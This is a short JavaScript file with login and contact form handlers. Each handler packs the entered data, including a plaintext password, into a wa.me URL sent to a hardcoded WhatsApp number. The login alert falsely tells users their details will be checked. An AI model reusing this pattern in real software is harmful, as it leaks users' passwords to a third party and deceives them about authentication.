function submitLogin(event) {
    event.preventDefault();
    name1=document.getElementById("123").value;
    password=document.getElementById("321").value;
    const whatsappNumber = "967780339461";

    const message = `Name: ${name1}\nPassword: ${password}\n He wants to login to your site .`;
    const whatsappLink = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
     alert('Thanks ' + name1 + ' \n Your login details will be checked ');
            window.location.href = whatsappLink;
}


    function submitMessage(event) {
    event.preventDefault();
    name2=document.getElementById("456").value;
    email=document.getElementById("855").value;
    content=document.getElementById("5632").value;
    const whatsappNumber = "967780339461";
     const message = `Name: ${name2}\nEmail: ${email}\nContent: ${content}`;
    const whatsappLink = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
     alert('Thanks ' + name2 + ' \n Your message has been sent ');
            window.location.href = whatsappLink;

    }